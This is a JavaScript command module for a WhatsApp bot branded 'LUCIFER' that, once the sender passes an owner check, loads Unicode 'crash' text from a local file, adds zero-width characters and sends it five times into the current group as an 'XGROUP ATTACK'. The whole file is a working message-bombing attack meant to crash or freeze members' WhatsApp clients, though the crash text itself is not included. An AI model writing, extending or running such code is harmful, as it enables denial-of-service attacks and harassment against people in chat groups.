const fs = require("fs");
const path = require("path");

// 🧼 Clean number
function getCleanNumber(jid) {
  return jid ? jid.replace(/\D/g, "") : null;
}

// 🔍 Resolve sender number
function resolveSenderNumber(m, conn) {
  let senderJid =
    m.key?.participant ||
    m.participant ||
    m.message?.extendedTextMessage?.contextInfo?.participant ||
    m.sender ||
    (m.key?.fromMe && conn?.user?.id) ||
    m.key?.remoteJid;

  if (!senderJid && conn?.decodeJid) {
    try {
      senderJid = conn.decodeJid(m?.key?.remoteJid);
    } catch {
      senderJid = null;
    }
  }

  return getCleanNumber(senderJid);
}

module.exports = async function ({ conn, m, reply, jid }) {
  try {
    const isGroup = jid.endsWith("@g.us");
    if (!isGroup)
      return reply("❌ *Only for group use.*\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");

    const senderNum = resolveSenderNumber(m, conn);
    if (!senderNum) return reply("❌ Sender detect nahi ho saka.");

    // 🔐 Selfmode Owner Check
    const selfPath = path.join(__dirname, "media", "selfmode.json");
    if (!fs.existsSync(selfPath)) {
      return reply("⚠️ *I'm awaiting my owner's `.self` command to activate bot authority.*\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    const selfData = JSON.parse(fs.readFileSync(selfPath));
    const savedOwner = selfData.owner_sender;
    if (senderNum !== savedOwner) {
      return reply("🚫 *You're not my Master.*\n\n📛 This command is highly restricted.\n🧠 Only true Owner has this authority.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    // 📂 Load bug content from tayyabtext4.txt
    let unicode;
    try {
      unicode = fs.readFileSync("./media/tayyabtext4.txt", "utf-8");
    } catch {
      return reply("❌ Crash file missing: 😁");
    }

    const payload = "📛 *XGROUP ATTACK*\n\n⚠️\u200C\u200B\u200D\n\n" + unicode.repeat(1);
    const sendCount = 5;

    // 🚀 Send 5x with delay to current group
    for (let i = 0; i < sendCount; i++) {
      try {
        await conn.sendMessage(jid, { text: payload }, { quoted: m });
        await new Promise((res) => setTimeout(res, 1500));
      } catch {
        return reply(`❌ Failed to send xgroup bug at attempt #${i + 1}.`);
      }
    }

    return reply(`✅ *XGROUP attack launched in this group!*\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓`);

  } catch (err) {
    return reply("❌ Error while sending xgroup bug. Check logs.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
  }
};